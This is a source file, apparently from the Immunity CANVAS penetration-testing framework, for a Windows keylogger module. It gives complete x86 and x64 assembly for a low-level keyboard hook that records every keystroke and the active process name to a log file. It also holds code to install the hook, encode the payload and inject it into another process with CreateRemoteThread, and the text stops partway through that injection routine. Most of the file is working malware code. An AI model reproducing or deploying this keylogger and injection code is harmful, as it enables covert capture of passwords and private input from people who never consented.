#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME            = "Win32/Win64 Keylogger"
DESCRIPTION     = "Simple Win32/Win64 Keylogger"
DOCUMENTATION   = {}
VERSION         = "1.1"

PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """ This logger has to be in a process that is in the
active desktop. E.g. explorer.exe. So if you're in a process that is NOT on
the active desktop (say lsass.exe or services.exe) you just set the pid for a
process that is, and it will inject the logger into that process.

This simple approach makes the logger very flexible for practical usage.
"""

NOTES="""
Simple lowlevel keylogging (which requires no dll). For this keylogger to work you'll have
to make sure that it is running in a process on the active desktop. Which is why we made it
thread injectable. So if you're inside LSASS, inject into a process on the desktop.

For local thread just run, for remote thread set 'pid' argument to pid of process you want
to inject into. e.g. -O pid:pidofnotepad.exe

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name     = NAME
        self.node     = None
        self.pid      = 0
        self.term     = 0
        self.logfile  = None
        self.is_win64 = False

    def neededListenerTypes(self): 
        return []

    def hookProcedure(self):
        hookFunctionVars = {}
        
        #struct WM_KEYBOARD_LL {
        #    int vkCode;
        #    int scanCode;
        #    int flags;
        #    int time;
        #               
        #    int *dwExtraInfo;
        #};
        hookFunctionAsmWin64 = """
    pushq %rbp
    pushq %rbx
    pushq %rdi
    pushq %rsi
    pushq %r12
    pushq %r13
    pushq %r14
    pushq %r15
    movq %rsp, %rbp
starthook:
    // get our in args (nCode, wParam, lParam)
    movq %rcx, %r12      // nCode
    movq %rdx, %r13      // wParam
    movq %r8,  %r14      // lParam -> is a pointer to a WH_KEYBOARD_LL struct

    // HC_ACTION == 0
    test %r12, %r12
    jnz callnexthook

    // if HC_ACTION we can process this event
    // check for either wParam of WM_SYSKEYDOWN or WM_KEYDOWN
    cmpw $0x0100,%r13w // WM_KEYDOWN
    je processevent
    cmpw $0x0104,%r13w // WM_SYSKEYDOWN
    jne callnexthook

processevent:

    // test for keys we want to SKIP here, (like shift being held down is annoying)
    // first DWORD in the WH_KEYBOARD_LL struct is a vkCode
    movb (%r14),%al
    cmpb $0x14,%al // VK_CAPITAL
    je callnexthook
    cmpb $0xa0,%al // VK_LSHIFT
    je callnexthook
    cmpb $0xa1,%al // VK_RSHIFT
    je callnexthook

    // ################# LOGFILE CONTROLLED HERE ############################
    pushq $0
    //PUSHLOGHERE

    movq %rsp, %rsi

    
    movq $0, %rax
    push %rax
    movq $0x0080, %rax
    push %rax
    movq $0x0004, %rax // set to OPEN_ALWAYS
    push %rax
    sub $0x20, %rsp
    movq $0, %r9
    movq $0, %r8
    movq $0x40000000, %rdx
    mov  %rsi, %rcx
    movq $CREATEFILE, %rax
    call *%rax
    add $0x38, %rsp


    // if we cant log, no reason to handle it
    cmp $-1,%rax
    je callnexthook
    test %rax,%rax
    jz callnexthook
        
    movq %rax,%r15 // log handle in r15

    // position the file pointer to end of file
    movq $2, %r9    // FILE_END
    movq $0, %r8   // high is NULL
    movq $0, %rdx  // we don't want to move it from FILE_END
    movq %r15, %rcx 
    movq $SETFILE,%rax
    call *%rax

    // WINDOW HANDLE HANDLING HERE...
    movq $GETFGWINDOW,%rax
    call *%rax 

    jmp getwindow
gotwindow:
    popq %rbx
    cmp %rax,(%rbx)
    je getkeyname // skip process name muck if same handle as last log event
    movq %rax,(%rbx) // update if not equal
        
processname:
    pushq %rax // save handle
        
    // get the PID of the window process
    pushq $0
    movq %rsp,%rdx
    movq %rax,%rcx // push handle
    movq $GETWPID,%rax
    call *%rax
    popq %rax
    // pid in rax, checkme, do PS style fun

    // to get full name use snapshot kernel32.dll toolhelp
    // or openprocess/getbasemodulefromhandle...problem:
    // these require outside dlls, and because this logger
    // is injectable, we can not assume psapi or toolhelp
    // is available for the remote thread..so toolhelp
    // is the only option

    pushq %rax
        
    // process entry struct
    subq $0x1060,%rsp
    movq %rsp,%rdi // rdi points to struct
        
    // get snapshot handle
    movq $0, %rdx
    movq $2, %rcx
    movq $CREATETOOLHELP32SNAPSHOT,%rax
    call *%rax
    test %rax,%rax
    jz getkeyname
        
    // set size into struct
    movl $0x1060,(%rdi)

    pushq %rax 

    // process first
    mov %rdi, %rdx
    mov %rax, %rcx
    movq $PROCESS32FIRST,%rax
    call *%rax
    test %rax,%rax
    jz errortoolhelp

    pop %rax // get handle back

    // check if it's our process
    movl 8(%rdi),%ebx
    cmpl %ebx,0x1060(%rdi) // where our saved PID lives
    je logname

// loop through all the processes untill we find our pid
nextprocessloop:
        
    pushq %rax

    // process next
    movq %rdi, %rdx
    movq %rax, %rcx 
    movq $PROCESS32NEXT,%rax
    call *%rax
    test %eax,%eax
    jz errortoolhelp

    popq %rax

    movl 8(%rdi),%ebx
    cmpl %ebx,0x1060(%rdi)
    jne nextprocessloop

logname:
    pushq %rax // push handle
        
    add $0x2C,%rdi // edi now points to a null terminated string with the name

    movq %rdi,%rsi

    // pre header ## NAME.EXE ##
    // terminate with some spaces
    movq $0x2023230d,%rax  // little kludge for now

    push %rax
    movq %rsp,%rcx

    movq $4,  %r8
    mov %rcx, %rdx
    mov %r15, %rcx
    call writefile

    // clear stack
    pop %rax

    // loop untill nul byte
writenamebyte:
    movq $1, %r8
    mov %rsi, %rdx
    mov %r15, %rcx
    call writefile

    // test next char for nul
    incl %rsi
    xorl %rcx,%rcx
    movb (%rsi),%cl
    test %ecx,%ecx
    jnz writenamebyte

    // terminate with a NAME.EXE ## newline
    movl $0x0b232320,%ecx // little kludge for now
    subl $0x01000000,%ecx // workaround
    push %rcx
    movq %rsp,%rax

    movq $4, %r8
    mov %rax, %rdx
    mov %r15, %rcx
    call writefile

    // clear stack
    pop %rax
        
// close snapshot handle and continue into getkeyname
errortoolhelp:
    // handle is already on stack, close it
    pop %rcx
    movq $CLOSEHANDLE,%rax
    call *%rax

    // adjust stack, and restore vars
    add $0x1060,%rsp
    pop %rax

getkeyname:     
    sub $0x1000, %rsp
    movq %rsp, %rsi // lpString

    // use GetKeyNameText to get a description
    movq %r14,%rdx // get lParam
    movl $1,%eax
    xor %rbx, %rbx
    xor %rcx, %rcx
    movl 4(%rdx),%ebx // scanCode
    movl 8(%rdx),%ecx // flags
    shll $16,%ebx // put scanCode bits in right place
    shll $24,%ecx // put flags bits in right place
    orl %ebx,%eax 
    orl %ecx,%eax // lParam for GetKeyNameText 
    
    movq %rsi, %rbx
    pushq $0
    pushq $0
    pushq $0
    movq $0x1000, %r8
    movq %rsi, %rdx
    movl %eax, %ecx
    movq $GETKEYNAME,%rax
    call *%rax
    add $0x18, %rsp

    
    pushq %rax // rax now has length of string

    // %edi = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
    pushq $0  // shadow space
    movq $0x14, %rcx // VK_CAPITAL
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $1,%eax
    movl %eax,%edi

    // GetKeyState(VK_SHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0x10, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    // GetKeyState(VK_LSHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0xA0, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    // GetKeyState(VK_RSHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0xA1, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    jmp test_is_lower


change_lower_case:
    test %edi, %edi
    jz lower_to_true
    mov $0, %edi
    jmp test_is_lower
 lower_to_true:
    mov $1, %edi


test_is_lower:
    test %edi,%edi
    jnz nolower
        
    // tolower any char
    // if len == 1, not-special char
    cmpl $1,(%rsp)
    jne nolower
    movq %rbx, %rsi

    // ok lower this character if > 0x40
    movb (%rsi),%cl
    movb $0x40,%ch
    cmpb %cl,%ch
    jge nolower
        
    addb $0x20,%cl
    movb %cl,(%rsi)
        
nolower:

    popq %rax
    movq %rbx, %rsi
        
flushtolog:
    // if eax is not 1, we need special char brackets [Space]
    cmpl $1,%eax
    jne special

notspecial:

    nop // our memcpy works as a string literal, prevent 0x22 byte

    movq %rax, %r8
    movq %rsi, %rdx
    movq %r15, %rcx
    call writefile
    jmp logged // kludge

        // special bracket name bracket logging format
special:

    pushq %rax

    pushq $0x5b
    movq %rsp,%rcx

    movq $1, %r8
    movq %rcx, %rdx
    movq %r15, %rcx
    call writefile
    popq %rax    // eat string

    popq %rax   // restore string size

    movq %rax, %r8
    movq %rsi, %rdx
    movq %r15, %rcx
    call writefile
        
    pushq $0x5d
    movq %rsp,%rcx

    movq $1, %r8
    movq %rcx, %rdx
    movq %r15, %rcx    
    call writefile
    popq %rax    // eat string
    // end of special name logging

logged:

    // 108 due to pushl 0x5d cleanup, also fixes 0x100
    // mosdef quirk for now
    add $0x1000,%rsp

    // CloseHandle the file
    pushq $0
    movq %r15, %rcx 
    movq $CLOSEHANDLE,%rax
    call *%rax
    add $8, %rsp
        
callnexthook:
    pushq $0
    pushq $0
    pushq $0
    pushq $0
    movq %r14, %r9
    movq %r13, %r8
    movq %r12, %rdx
    movq $0, %rcx
    movq $NEXTHOOK,%rax // do this dynamically after testing
    call *%rax
    add $0x20, %rsp

returnhooker:
    // return value is already in %eax
    movq %rbp,%rsp
    popq %r15
    popq %r14
    popq %r13
    popq %r12
    popq %rsi
    popq %rdi
    popq %rbx
    popq %rbp    
    ret

    // HELPER FUNCTIONS

// writefile(handle, string, len)
writefile:
    push %rbp
    movq %rsp,%rbp

    // log the string with WriteFile (handle is in edi)
    pushq $0
    movq %rsp,%rbx // &bWritten
       
                
    push %rcx      // save handle 

    pushq $0
    sub $0x20, %rsp
    movq %rbx, %r9 // &bWritten
    movq $WRITEFILE,%rax
    call *%rax
    add $0x28, %rsp

    pop %rcx       // restore handle


    pushq %rax      // save WriteFile return value

    pushq $0
    movq $FLUSHFILE,%rax
    call *%rax
    add $8, %rsp

    popq %rax      // restore WriteFile return value
    
    movq %rbp,%rsp
    pop %rbp
    ret 

getwindow:
    call gotwindow


    .long 0x41424344
    .long 0x45464748
"""

        hookFunctionAsmWin32 = """
        // because this has to be a callable standalone function, and we can't
        // do function pointers properly I have to do this handler in assembly
        push %ebp
        movl %esp,%ebp

        pushl %ebx
        pushl %esi
        pushl %edi

        starthook:
        // get our in args (nCode, wParam, lParam)
        movl 0x08(%ebp),%ebx // nCode
        movl 0x0c(%ebp),%ecx // wParam
        movl 0x10(%ebp),%edx // lParam -> is a pointer to a WH_KEYBOARD_LL struct

        // HC_ACTION == 0
        test %ebx,%ebx
        jnz callnexthook

        // if HC_ACTION we can process this event
        // check for either wParam of WM_SYSKEYDOWN or WM_KEYDOWN
        cmpw $0x0100,%cx // WM_KEYDOWN
        je processevent
        cmpw $0x0104,%cx // WM_SYSKEYDOWN
        jne callnexthook

        processevent:

        // test for keys we want to SKIP here, (like shift being held down is annoying)
        // first DWORD in the WH_KEYBOARD_LL struct is a vkCode
        movb (%edx),%al
        cmpb $0x14,%al // VK_CAPITAL
        je callnexthook
        cmpb $0xa0,%al // VK_LSHIFT
        je callnexthook
        cmpb $0xa1,%al // VK_RSHIFT
        je callnexthook
        // ################# LOGFILE CONTROLLED HERE ############################
        pushl $0
        //PUSHLOGHERE
        movl %esp,%esi
        pushl $0
        pushl $0x0080 // to hide set FILE_ATTRIBUTE_HIDDEN too (0x2)
        pushl $0x0004 // set to OPEN_ALWAYS
        pushl $0
        pushl $0
        pushl $0x40000000
        pushl %esi
        movl $CREATEFILE,%eax
        call *%eax
        addl $8,%esp

        // if we cant log, no reason to handle it
        cmpl $-1,%eax
        je callnexthook
        test %eax,%eax
        jz callnexthook
        movl %eax,%edi // log handle in %edi

        // position the file pointer to end of file
        pushl $2 // FILE_END
        pushl $0 // high is NULL
        pushl $0 // we don't want to move it from FILE_END
        pushl %edi 
        movl $SETFILE,%eax
        call *%eax

        // WINDOW HANDLE HANDLING HERE...
        movl $GETFGWINDOW,%eax
        call *%eax 
        jmp getwindow
        gotwindow:
        popl %ebx
        cmpl %eax,(%ebx)
        je getkeyname // skip process name muck if same handle as last log event
        movl %eax,(%ebx) // update if not equal
        processname:
        pushl %eax // save handle
        // get the PID of the window process
        pushl $0
        movl %esp,%ecx
        pushl %ecx // &PID
        pushl %eax // push handle
        movl $GETWPID,%eax
        call *%eax
        popl %eax
        // pid in eax, checkme, do PS style fun

        // to get full name use snapshot kernel32.dll toolhelp
        // or openprocess/getbasemodulefromhandle...problem:
        // these require outside dlls, and because this logger
        // is injectable, we can not assume psapi or toolhelp
        // is available for the remote thread..so toolhelp
        // is the only option

        pushl %edi
        pushl %eax
        // process entry struct
        subl $1060,%esp
        movl %esp,%edi // edi points to struct
        // get snapshot handle
        pushl $0
        pushl $2
        movl $CREATETOOLHELP32SNAPSHOT,%eax
        call *%eax
        test %eax,%eax
        jz getkeyname
        // set size into struct
        movl $1060,(%edi)

        pushl %eax
        // process first
        pushl %edi
        pushl %eax
        movl $PROCESS32FIRST,%eax
        call *%eax
        test %eax,%eax
        jz errortoolhelp
        popl %eax // get handle back

        // check if it's our process
        movl 8(%edi),%ebx
        cmpl %ebx,1060(%edi) // where our saved PID lives
        je logname

        // loop through all the processes untill we find our pid
        nextprocessloop:
        pushl %eax
        // process next
        pushl %edi
        pushl %eax
        movl $PROCESS32NEXT,%eax
        call *%eax
        test %eax,%eax
        jz errortoolhelp
        popl %eax

        movl 8(%edi),%ebx
        cmpl %ebx,1060(%edi)
        jne nextprocessloop

        logname:
        pushl %eax // push handle
        addl $36,%edi // edi now points to a null terminated string with the name

        movl %edi,%esi
        movl 1028(%edi),%edi // get filehandle for log header

        // pre header ## NAME.EXE ##
        // terminate with some spaces
        movl $0x2023230d,%ecx  // little kludge for now
        decl %ecx
        pushl %ecx
        movl %esp,%ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writefile
        // clear stack
        popl %eax

        // loop untill nul byte
        writenamebyte:
        pushl $1
        pushl %esi
        pushl %edi
        call writefile

        // test next char for nul
        incl %esi
        xorl %ecx,%ecx
        movb (%esi),%cl
        test %ecx,%ecx
        jnz writenamebyte

        // terminate with a NAME.EXE ## newline
        movl $0x0b232320,%ecx // little kludge for now
        subl $0x01000000,%ecx // workaround
        pushl %ecx
        movl %esp,%ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writefile
        // clear stack
        popl %eax
        // close snapshot handle and continue into getkeyname
        errortoolhelp:
        // handle is already on stack, close it
        movl $CLOSEHANDLE,%eax
        call *%eax
        // adjust stack, and restore vars
        addl $1060,%esp
        popl %eax
        popl %edi

        getkeyname:

        subl $0x100,%esp
        movl %esp,%esi // lpString
        // use GetKeyNameText to get a description
        movl 0x10(%ebp),%edx // get lParam
        movl $1,%eax
        movl 4(%edx),%ebx // scanCode
        movl 8(%edx),%ecx // flags
        shll $16,%ebx // put scanCode bits in right place
        shll $24,%ecx // put flags bits in right place
        orl %ebx,%eax 
        orl %ecx,%eax // lParam for GetKeyNameText 
        pushl $0x100
        pushl %esi
        pushl %eax
        movl $GETKEYNAME,%eax
        call *%eax
        pushl %edi
        pushl %esi
        pushl %eax
        // eax now has length of string

        // test for L_SHIFT/R_SHIFT/CAPS_LOCK accordingly
        // shiftstate in esi, capstate in edi
        pushl $0x10 // VK_SHIFT
        movl $GETKEYSTATE,%eax
        call *%eax
        andl $0x8000,%eax
        shrl $15,%eax
        movl %eax,%esi

        pushl $0x14 // VK_CAPITAL
        movl $GETKEYSTATE,%eax
        call *%eax
        andl $1,%eax
        movl %eax,%edi

        // test capstate XOR shiftstate
        xorl %edi,%esi
        test %esi,%esi
        jnz nolower
        // tolower any char
        // if len == 1, not-special char
        cmpl $1,(%esp)
        jne nolower
        movl 4(%esp),%esi

        // ok lower this character if > 0x40
        movb (%esi),%cl
        movb $0x40,%ch
        cmpb %cl,%ch
        jge nolower
        addb $0x20,%cl
        movb %cl,(%esi)
        nolower:

        popl %eax
        popl %esi
        popl %edi
        flushtolog:
        // if eax is not 1, we need special char brackets [Space]
        cmpl $1,%eax
        jne special

        notspecial:

        nop // our memcpy works as a string literal, prevent 0x22 byte

        pushl %eax
        pushl %esi
        pushl %edi
        call writefile
        jmp logged // kludge

        // special bracket name bracket logging format
        special:

        pushl %eax
        pushl $0x5b
        movl %esp,%ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writefile
        popl %eax
        popl %eax

        pushl %eax
        pushl %esi
        pushl %edi
        call writefile

        pushl $0x5d
        movl %esp,%ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writefile
        // end of special name logging

        logged:

        // 104 due to pushl 0x5d cleanup, also fixes 0x100
        // mosdef quirk for now
        addl $0x104,%esp

        // CloseHandle the file
        pushl %edi
        movl $CLOSEHANDLE,%eax
        call *%eax

        callnexthook:

        pushl 0x10(%ebp) // lParam
        pushl 0x0c(%ebp) // wParam
        pushl 0x08(%ebp) // nCode
        pushl $0
        movl $NEXTHOOK,%eax // do this dynamically after testing
        call *%eax

        returnhooker:

        // return value is already in %eax
        popl %edi
        popl %esi
        popl %ebx

        movl %ebp,%esp
        pop %ebp

        ret $12 // 3 dword args to this function

        // HELPER FUNCTIONS

        // writefile(handle, string, len)
        writefile:

        push %ebp
        movl %esp,%ebp

        pushl %ebx
        pushl %esi
        pushl %edi

        // log the string with WriteFile (handle is in edi)
        pushl $0
        movl %esp,%ebx // &bWritten

        // get the args 
        movl 8(%ebp),%edi
        movl 12(%ebp),%esi
        movl 16(%ebp),%eax

        pushl $0
        pushl %ebx // &bWritten
        pushl %eax // len
        pushl %esi // string
        pushl %edi // handle
        movl $WRITEFILE,%eax
        call *%eax
        pushl %eax
        // flush the handle
        pushl %edi
        movl $FLUSHFILE,%eax
        call *%eax
        popl %eax
        // eat bWritten
        popl %edi
        // return value is already in %eax
        popl %edi
        popl %esi
        popl %ebx

        movl %ebp,%esp
        pop %ebp

        ret $12 // handle, string, length

// GLOBALS

        // uuuuggglyyyyyyy !
        getwindow:
        call gotwindow
        .long 0x41424344

        """

        # get the addies for CallNextHookEx dynamically
        NEXTHOOK = self.node.shell.getprocaddress_withmalloc("user32.dll|CallNextHookEx")
        CREATEFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CreateFileA")
        WRITEFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|WriteFile")
        CLOSEHANDLE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CloseHandle")
        GETKEYNAME = self.node.shell.getprocaddress_withmalloc("user32.dll|GetKeyNameTextA")
        GETKEYSTATE = self.node.shell.getprocaddress_withmalloc("user32.dll|GetKeyState")
        SETFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|SetFilePointer")
        FLUSHFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|FlushFileBuffers")
        GETFGWINDOW = self.node.shell.getprocaddress_withmalloc("user32.dll|GetForegroundWindow")
        GETWPID = self.node.shell.getprocaddress_withmalloc("user32.dll|GetWindowThreadProcessId")
        CREATETOOLHELP32SNAPSHOT = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CreateToolhelp32Snapshot")
        PROCESS32FIRST = self.node.shell.getprocaddress_withmalloc("kernel32.dll|Process32First")
        PROCESS32NEXT = self.node.shell.getprocaddress_withmalloc("kernel32.dll|Process32Next")

        hookFunctionAsm = hookFunctionAsmWin64 if self.is_win64 else hookFunctionAsmWin32

        hookFunctionAsm = hookFunctionAsm.replace("NEXTHOOK", "0x%X"%NEXTHOOK)
        hookFunctionAsm = hookFunctionAsm.replace("CREATEFILE", "0x%X"%CREATEFILE)
        hookFunctionAsm = hookFunctionAsm.replace("WRITEFILE", "0x%X"%WRITEFILE)
        hookFunctionAsm = hookFunctionAsm.replace("CLOSEHANDLE", "0x%X"%CLOSEHANDLE)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYNAME", "0x%X"%GETKEYNAME)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYSTATE", "0x%X"%GETKEYSTATE)
        hookFunctionAsm = hookFunctionAsm.replace("SETFILE", "0x%X"%SETFILE)
        hookFunctionAsm = hookFunctionAsm.replace("FLUSHFILE", "0x%X"%FLUSHFILE)
        hookFunctionAsm = hookFunctionAsm.replace("GETFGWINDOW", "0x%X"%GETFGWINDOW)
        hookFunctionAsm = hookFunctionAsm.replace("GETWPID", "0x%X"%GETWPID)
        hookFunctionAsm = hookFunctionAsm.replace("CREATETOOLHELP32SNAPSHOT", "0x%X"%CREATETOOLHELP32SNAPSHOT)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32FIRST", "0x%X"%PROCESS32FIRST)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32NEXT", "0x%X"%PROCESS32NEXT)
        filenameString  = self.pushStringx64(self.logfile) if self.is_win64 else self.pushString(self.logfile)
        hookFunctionAsm = hookFunctionAsm.replace("//PUSHLOGHERE", filenameString)

        # node compile and return the stub
        from MOSDEF import mosdef
        hookFunction = mosdef.assemble(hookFunctionAsm, "X64" if self.is_win64 else "X86")
        return hookFunction

    def pushString(self, log): # returns a string as a series of stack pushes
        i = len(log)
        pushit = ""
        while (i):
            if i%4:
                addpush = "pushl $0x"
                while(i%4):
                    addpush += "%.2x"%ord(log[i-1]); i -= 1
                pushit += addpush + "\n"
            elif i >= 4: # step of 4 bytes left
                addpush = "pushl $0x"
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                pushit += addpush + "\n"
        return pushit

    def pushStringx64(self, log): # returns a string as a series of stack pushes
        i = len(log)
        pushit = ""
        while (i):
            if i%8:
                addpush = "movq $0x"
                while(i%8):
                    addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += ",%rax\npush %rax"
                pushit += addpush + "\n"
            elif i >= 8: # step of 4 bytes left
                addpush = "movq $0x"
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += ",%rax\npush %rax"
                pushit += addpush + "\n"

        return pushit
        
    def compileHookLogger(self):
        hookFunction = self.hookProcedure()

        # because MOSDEF is not good at function pointers, I have to node compile the stub
        # and memcpy the function into memory so I have an actual address for my procedure
        hookLoggerVars = {}
        hookLoggerVars["HOOKSIZE"] = len(hookFunction)
        hookLoggerVars["HOOKFUNCTION"] = hookFunction

        hookLoggerCode = """
        #import "IMPORT_TYPE", "kernel32.dll|GetModuleHandleA" as "GetModuleHandleA"
        #import "IMPORT_TYPE", "kernel32.dll|ExitThread" as "ExitThread"
        #import "IMPORT_TYPE", "user32.dll|SetWindowsHookExA" as "SetWindowsHookExA"
        #import "IMPORT_TYPE", "user32.dll|UnhookWindowsHookEx" as "UnhookWindowsHookEx"
        #import "IMPORT_TYPE", "user32.dll|GetMessageA" as "GetMessageA"
        #import "IMPORT_TYPE", "user32.dll|TranslateMessage" as "TranslateMessageA"
        #import "IMPORT_TYPE", "user32.dll|DispatchMessageA" as "DispatchMessageA"
        #import "IMPORT_TYPE", "user32.dll|RegisterHotKey" as "RegisterHotKey"
        #import "IMPORT_TYPE", "kernel32.dll|CreateMutexA" as "CreateMutexA"
        #import "IMPORT_TYPE", "kernel32.dll|OpenMutexA" as "OpenMutexA"
        #import "IMPORT_TYPE", "kernel32.dll|ReleaseMutex" as "ReleaseMutex"
        #import "IMPORT_TYPE", "kernel32.dll|GetLastError" as "GetLastError"
        #import "IMPORT_TYPE", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        
        #import "local", "debug" as "debug"
        #import "local", "memcpy" as "memcpy"
        
        #import "string", "HOOKFUNCTION" as "HOOKFUNCTION"
        #import "int", "HOOKSIZE" as "HOOKSIZE"

        struct POINT {
            int x;
            int y;
        };
 
        struct MSG {
            int hwnd;
            int message;
            char *wParam;
            char *lParam;
            int time;
            
            struct POINT pt;
        };

        void messageHandler(int tMsg)
        {
            // example from MSDN
            int bRet;
            int mRet;
            struct MSG msg;

            // we're only interested in tMsg, so set range accordingly
            // PM_NOREMOVE == 0x0000 PM_REMOVE == 0x0001 for peekmessage
            while(bRet = GetMessageA(&msg, 0, 0, 0))
            {
                return;
            }
        }
        
        void main()
        {
            char *KeyEvent;
            
            HANDLE_TYPE hHook;
            HANDLE_TYPE hModule;
            int lError;
            int tMsg; // msg identifier that halts logger
            int hMtx;
            
            // exit control via hotkey (mutex semantics seem not very spiffy on thread exit)
            RegisterHotKey(0, 0xdeadbabe, 0x04, 0x77); // RIGHT SHIFT + F8
            
            // get an address for our function because MOSDEF
            // doesn't do function pointers correctly yet
            
            KeyEvent = VirtualAlloc(0, HOOKSIZE, 0x1000, 0x40);   
            memcpy(KeyEvent, HOOKFUNCTION, HOOKSIZE);

            // handle to module
            hModule = GetModuleHandleA(0);
        
            // install the hook (WH_KEYBOARD_LL == 13)
            hHook = SetWindowsHookExA(13, KeyEvent, hModule, 0);
            
            // fall back on our message handling the mutex isn't there
            messageHandler(tMsg);

            // unhook
            UnhookWindowsHookEx(hHook);
        
            // this is running as a detached thread, so no sendint
            ExitThread(0);
        }
        """
        # node compile and return the logger
        self.node.shell.clearfunctioncache()

        if self.is_win64:
            hookLoggerCode = hookLoggerCode.replace('IMPORT_TYPE', 'local')
            hookLoggerCode = hookLoggerCode.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            hookLoggerCode = hookLoggerCode.replace('IMPORT_TYPE', 'remote')
            hookLoggerCode = hookLoggerCode.replace('HANDLE_TYPE', 'unsigned int')

        hookLogger = self.node.shell.compile(hookLoggerCode, hookLoggerVars)
        # XXX: we have to encode this untill we switch to a functionpointer version
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring("\"\n\x00")
        hookLogger = encoder.encode(hookLogger)

        return hookLogger

    def escapeFix(self, code):
        escaped = ""
        for c in code:
            if c == "\"":
                escaped += "\\"
            escaped += c
        return escaped
            
    def localThread(self, logCode):
        threadVars = {}

        threadVars["CODESIZE"] = len(logCode)
        threadVars["THREADME"] = logCode

        threadCode = """
        #import "IMPORT_TYPE", "kernel32.dll|CreateThread" as "CreateThread"
        #import "IMPORT_TYPE", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "IMPORT_TYPE", "kernel32.dll|CreateMutexA" as "CreateMutexA"
        #import "IMPORT_TYPE", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"        
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        
        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"
        #import "local", "debug" as "debug"
        
        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main() 
        {            
            HANDLE_TYPE hThread;
            char *fp;
            HANDLE_TYPE hMtx;

            fp = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);
            memcpy(fp, THREADME, CODESIZE);

            // before we start the logger, create a mutex TERMLOG that is initially owned
            hMtx = CreateMutexA(0, 1, "Global\\TERMLOG");
            // make sure we have ownership, might be a double run where we previously
            // released this mutex and it already exists
            WaitForSingleObject(hMtx, -1);

            hThread = CreateThread(0, 0, fp, 0, 0, 0);
            if (hThread == 0)
            {
                // failed
                sendint(hThread);
            }
            CloseHandle(hThread);
            sendint(1);
        }
        """

        if self.is_win64:
            threadCode = threadCode.replace('IMPORT_TYPE', 'local')
            threadCode = threadCode.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            threadCode = threadCode.replace('IMPORT_TYPE', 'remote')
            threadCode = threadCode.replace('HANDLE_TYPE', 'unsigned int')

        return self.node.shell.runCode(threadCode, threadVars)

    def remoteThread(self, logCode, pid):

        injectVars = {}
        injectVars["PID"] = pid
        injectVars["CODESIZE"] = len(logCode)
        #logCode = self.escapeFix(logCode) # XXX
        injectVars["THREADME"] = logCode

        injectCode = """
        #import "IMPORT_TYPE","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "IMPORT_TYPE","kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "IMPORT_TYPE","kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "IMPORT_TYPE","kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"

        #import "IMPORT_TYPE", "kernel32.dll|CreateMutexA" as "CreateMutex"
        #import "IMPORT_TYPE", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        #import "int", "PID" as "PID"
        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main()
        {
